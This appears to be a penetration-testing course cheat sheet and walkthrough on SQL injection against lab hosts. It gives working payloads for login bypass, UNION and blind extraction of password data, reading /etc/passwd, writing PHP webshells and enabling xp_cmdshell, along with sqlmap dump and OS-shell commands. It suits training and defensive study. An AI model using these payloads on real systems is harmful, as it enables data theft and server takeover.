# SQL Injection Attacks - Cheat Sheet & Walkthrough

## Table of Contents
1. [SQL Theory and Databases](#1-sql-theory-and-databases)
2. [Manual SQL Injection Exploitation](#2-manual-sql-injection-exploitation)
3. [Code Execution and Automation](#3-code-execution-and-automation)
4. [Quick Reference](#4-quick-reference)

---

## 1. SQL Theory and Databases

### 1.1 SQL Theory Refresher

#### What is SQL?
**Structured Query Language** - Used to manage and interact with data in relational databases.

#### SQL Operations
| Operation | Purpose |
|-----------|---------|
| `SELECT` | Query/retrieve data |
| `INSERT` | Add new data |
| `UPDATE` | Modify existing data |
| `DELETE` | Remove data |

#### Basic SQL Query Example
```sql
SELECT * FROM users WHERE user_name='leon'
```

#### Vulnerable PHP Code
```php
<?php
$uname = $_POST['uname'];
$passwd = $_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

**Problem**: User input goes directly into SQL query without sanitization.

---

### 1.2 Database Types and Characteristics

#### Popular Database Variants

| Database | Platform | Default Port | Key Features |
|----------|----------|--------------|--------------|
| **MySQL** | Cross-platform | 3306 | Open source, popular with PHP |
| **MariaDB** | Cross-platform | 3306 | MySQL fork |
| **MSSQL** | Windows | 1433 | Microsoft's RDBMS |
| **PostgreSQL** | Cross-platform | 5432 | Advanced open source |
| **Oracle** | Cross-platform | 1521 | Enterprise-grade |

---

#### MySQL Enumeration

**Connect to MySQL**:
```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
```

**Basic MySQL Commands**:
```sql
-- Check version
SELECT version();

-- Check current user
SELECT system_user();

-- List databases
SHOW DATABASES;

-- Use a database
USE mysql;

-- List tables
SHOW TABLES;

-- Query a table
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

**MySQL Password Hashes**:
- `authentication_string` field
- Caching-SHA-256 algorithm (modern)
- Old style: `password` field with MD5

---

#### MSSQL Enumeration

**Connect with Impacket**:
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

**Basic MSSQL Commands**:
```sql
-- Check version
SELECT @@version;

-- List databases
SELECT name FROM sys.databases;

-- Use a database
USE offsec;

-- List tables
SELECT * FROM offsec.information_schema.tables;

-- Query a table
SELECT * FROM offsec.dbo.users;
```

**MSSQL System Databases**:
| Database | Purpose |
|----------|---------|
| `master` | System-wide configuration |
| `tempdb` | Temporary objects |
| `model` | Template for new databases |
| `msdb` | SQL Agent jobs/alerts |

**MSSQL Important Tables**:
```sql
-- Users in master
SELECT * FROM master.sysusers;

-- Database permissions
SELECT * FROM master.sys.database_permissions;
```

---

## 2. Manual SQL Injection Exploitation

### 2.1 Identifying SQLi (Error-Based)

#### Authentication Bypass Attack

**Vulnerable Query**:
```sql
SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'
```

**Payload**:
```
offsec' OR 1=1 -- //
```

**Resulting Query**:
```sql
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 -- //' AND password='$passwd'
```

**Test Steps**:
1. Try valid username with wrong password → Error
2. Add single quote (`'`) → SQL error indicates injection point
3. Use `' OR 1=1 -- //` → Authentication bypass

#### Error-Based Data Extraction

**Payload to retrieve version**:
```
' or 1=1 in (SELECT @@version) -- //
```

**Payload to retrieve passwords**:
```
' or 1=1 in (SELECT password FROM users) -- //
```

**Payload for specific user**:
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

---

### 2.2 UNION-Based SQL Injection

#### Prerequisites for UNION Attacks
1. Same number of columns as original query
2. Compatible data types between columns

#### Step 1: Determine Number of Columns

**Payload**:
```sql
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 3-- //
' ORDER BY 4-- //
' ORDER BY 5-- //
```

**Try increasing numbers until error occurs**

**Alternative**:
```sql
' UNION SELECT null-- //
' UNION SELECT null,null-- //
' UNION SELECT null,null,null-- //
' UNION SELECT null,null,null,null-- //
```

#### Step 2: Find Displayed Columns

**Payload**:
```sql
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
```

#### Step 3: Extract Database Information

**Current database name, user, version**:
```sql
%' UNION SELECT database(), user(), @@version, null, null -- //
```

**Fix column order if first column is integer**:
```sql
' UNION SELECT null, null, database(), user(), @@version -- //
```

#### Step 4: Enumerate Tables and Columns

**Find tables**:
```sql
' UNION SELECT null, table_name, column_name, table_schema, null 
FROM information_schema.columns 
WHERE table_schema=database() -- //
```

#### Step 5: Dump Data

**Extract from users table**:
```sql
' UNION SELECT null, username, password, description, null 
FROM users -- //
```

---

### 2.3 Blind SQL Injection

#### Boolean-Based Blind SQLi

**Concept**: Application returns different responses for TRUE vs FALSE conditions

**Payloads**:
```
# True condition - returns normal page
http://target/blindsqli.php?user=offsec' AND 1=1 -- //

# False condition - returns different page
http://target/blindsqli.php?user=offsec' AND 1=2 -- //

# Check for existence of other users
http://target/blindsqli.php?user=offsec' AND EXISTS(SELECT * FROM users WHERE username='admin') -- //
```

#### Time-Based Blind SQLi

**Concept**: Database delays response based on condition

**MySQL Delay**:
```
# Sleep for 3 seconds if true
http://target/blindsqli.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- //

# Check if user 'admin' exists
http://target/blindsqli.php?user=offsec' AND IF (EXISTS(SELECT * FROM users WHERE username='admin'), sleep(3), 'false') -- //
```

**MSSQL Delay**:
```
# WAITFOR DELAY
http://target/page?user=offsec' AND IF (1=1) WAITFOR DELAY '0:0:3' -- //

# Check user exists
http://target/page?user=offsec' AND IF EXISTS(SELECT * FROM users WHERE username='admin') WAITFOR DELAY '0:0:3' -- //
```

**PostgreSQL Delay**:
```
# pg_sleep
http://target/page?user=offsec' AND IF (1=1, pg_sleep(3), 'false') -- //
```

#### Substring Extraction (Boolean)

**Extract character by character**:
```sql
# Check if first character of admin's password is 'a'
http://target/blindsqli.php?user=offsec' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' -- //
```

**Character set for brute force**:
```
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()
```

---

## 3. Code Execution and Automation

### 3.1 Manual Code Execution

#### MSSQL - xp_cmdshell

**Enable xp_cmdshell**:
```sql
-- Show advanced options
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXECUTE xp_cmdshell 'whoami';
EXECUTE xp_cmdshell 'ipconfig';
EXECUTE xp_cmdshell 'dir C:\\';
```

**PowerShell Reverse Shell via xp_cmdshell**:
```sql
EXECUTE xp_cmdshell 'powershell -enc BASE64_PAYLOAD';
```

#### MySQL - INTO OUTFILE

**Write webshell to disk**:
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null 
INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

**Requirements**:
1. `secure_file_priv` must be set
2. Writable directory
3. FILE privilege

**Check file write permissions**:
```sql
-- Check secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';

-- Check file privileges
SELECT grantee, privilege_type 
FROM information_schema.user_privileges 
WHERE privilege_type = 'FILE';
```

**Alternative: Write to /tmp**:
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null 
INTO OUTFILE "/tmp/webshell.php" -- //
```

---

### 3.2 Automating with SQLMap

#### Basic SQLMap Commands

**Test for injection**:
```bash
sqlmap -u "http://target/page.php?param=value" -p param
```

**POST request from file**:
```bash
# First, save Burp request to post.txt
sqlmap -r post.txt -p parameter_name
```

**Dump database**:
```bash
sqlmap -u "http://target/page.php?param=value" -p param --dump
```

**Dump specific table**:
```bash
sqlmap -u "http://target/page.php?param=value" -p param -D db_name -T table_name --dump
```

**Get OS shell**:
```bash
sqlmap -u "http://target/page.php?param=value" -p param --os-shell --web-root /var/www/html
```

**Get interactive SQL shell**:
```bash
sqlmap -u "http://target/page.php?param=value" -p param --sql-shell
```

#### SQLMap Options

| Option | Purpose |
|--------|---------|
| `-u` | Target URL |
| `-p` | Parameter to test |
| `-r` | Request file (Burp format) |
| `-data` | POST data |
| `--cookie` | Set cookies |
| `-D` | Database name |
| `-T` | Table name |
| `--dump` | Dump table contents |
| `--os-shell` | Get OS shell |
| `--sql-shell` | Get SQL shell |
| `--level` | Test depth (1-5) |
| `--risk` | Risk level (1-3) |
| `--threads` | Number of threads |
| `--batch` | Auto answer prompts |
| `--dbms` | Force DBMS type |

#### SQLMap Level/Risk Settings

| Level | Tests | Risk | Tests |
|-------|-------|------|-------|
| 1 | Default | 1 | Default |
| 2 | More headers | 2 | Add heavy tests |
| 3 | More parameters | 3 | Add OR boolean |

---

### 3.3 Database-Specific SQLMap Commands

#### MySQL
```bash
# Basic
sqlmap -u "http://target/index.php?page=1" -p page

# With cookie
sqlmap -u "http://target/index.php?page=1" -p page --cookie="PHPSESSID=abc123"

# Dump all
sqlmap -u "http://target/index.php?page=1" -p page --dump-all
```

#### MSSQL
```bash
# Use Windows auth
sqlmap -u "http://target/index.php?page=1" -p page --dbms=mssql

# With credentials
sqlmap -u "http://target/index.php?page=1" -p page --dbms=mssql --auth=Administrator:Lab123
```

---

## 4. Quick Reference

### SQL Injection Classification

| Type | Description | Detection |
|------|-------------|-----------|
| **Error-Based** | Returns database errors | SQL errors in response |
| **UNION-Based** | Appends SELECT queries | Data appears in response |
| **Boolean Blind** | True/False responses | Page changes based on condition |
| **Time Blind** | Time delay responses | Response time changes |
| **Out-of-Band** | Alternative channels | DNS/HTTP requests |

### Common Test Payloads

```sql
-- Basic
' OR 1=1 -- //
' OR '1'='1' -- //
') OR 1=1 -- //

-- Union
' UNION SELECT null -- //
' UNION SELECT null,null -- //

-- Error
' AND 1=1 -- //
' AND 1=2 -- //
' AND (SELECT 1) -- //

-- Time
' AND SLEEP(5) -- //
' AND IF(1=1, SLEEP(5), 0) -- //

-- Comment out
' -- //
' # 
' /* */
```

### Database Comments

| Database | Comment Syntax |
|----------|----------------|
| MySQL | `-- `, `#`, `/* */` |
| MSSQL | `-- `, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

### Database String Concatenation

| Database | Syntax |
|----------|--------|
| MySQL | `CONCAT('a','b')` |
| MSSQL | `'a' + 'b'` |
| PostgreSQL | `'a' || 'b'` |
| Oracle | `'a' || 'b'` |

### SQLMap Output Status

| Indicator | Meaning |
|-----------|---------|
| `[*]` | Information |
| `[INFO]` | Status update |
| `[WARNING]` | Non-critical issue |
| `[CRITICAL]` | Critical error |
| `[PAYLOAD]` | Injected payload |
| `[DATA]` | Retrieved data |

---

## 5. Attack Checklist

### Manual SQL Injection Testing

- [ ] Identify input points (GET/POST/Headers)
- [ ] Test with single quote (`'`) → Look for SQL errors
- [ ] Test with `AND 1=1` vs `AND 1=2`
- [ ] Test `' OR 1=1 -- //` for authentication bypass
- [ ] Determine number of columns (`ORDER BY`, `UNION SELECT null`)
- [ ] Find displayed columns
- [ ] Extract database information
- [ ] Enumerate tables and columns
- [ ] Dump data
- [ ] Test for file write (MySQL)
- [ ] Test for command execution (MSSQL)
- [ ] Consider `sqlmap` automation

### Defensive Checklist

| Attack | Defense |
|--------|---------|
| SQL Injection | Parameterized queries |
| Authentication Bypass | Use prepared statements |
| UNION Attacks | Validate input/output |
| Blind SQLi | Sanitize all user input |
| Code Execution | Least privilege principle |

---

## 6. Common SQL Injection Error Messages

### MySQL Errors
```
You have an error in your SQL syntax
Unknown column 'x' in 'order clause'
The used SELECT statements have a different number of columns
```

### MSSQL Errors
```
Unclosed quotation mark
Column name or number of supplied values does not match
Conversion failed when converting the nvarchar value
```

### How Errors Help
| Error Type | What It Reveals |
|------------|-----------------|
| Syntax error | Injection point exists |
| Column mismatch | Number of columns |
| Type mismatch | Column data types |
| Table missing | Database structure |

---

## 7. Advanced Payloads

### MySQL File Read
```sql
' UNION SELECT load_file('/etc/passwd'), null, null, null, null -- //
```

### MySQL File Write
```sql
' UNION SELECT '<?php system($_GET["cmd"]);?>', null, null, null, null 
INTO OUTFILE '/var/www/html/shell.php' -- //
```

### MSSQL Extended Stored Procedures
```sql
-- Execute command
EXEC xp_cmdshell 'dir C:\\';

-- Read registry
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\MSSQLServer', 'CurrentVersion';

-- Create registry key
EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Test', 'ValueName', 'REG_SZ', 'TestValue';
```

### Union All with MySQL Info
```sql
-- Database details
' UNION SELECT null, null, database(), user(), @@version -- //

-- All tables
' UNION SELECT null, null, table_name, null, null 
FROM information_schema.tables WHERE table_schema=database() -- //

-- All columns
' UNION SELECT null, null, column_name, null, null 
FROM information_schema.columns WHERE table_name='users' -- //
```

---

## Key Takeaways

| Concept                   | Key Point                                                  |
| ------------------------- | ---------------------------------------------------------- |
| **SQLi Goal**             | Manipulate SQL queries to extract data or execute commands |
| **Authentication Bypass** | Use `' OR 1=1 -- //` to bypass login                       |
| **UNION Attacks**         | Need same number of columns and compatible data types      |
| **Blind SQLi**            | Use boolean (TRUE/FALSE) or time delays                    |
| **MSSQL RCE**             | Enable/use xp_cmdshell                                     |
| **MySQL RCE**             | Use INTO OUTFILE to write webshell                         |
| **SQLMap**                | Automate detection and exploitation                        |
| **Stealth**               | SQLMap is noisy - use manually when possible               |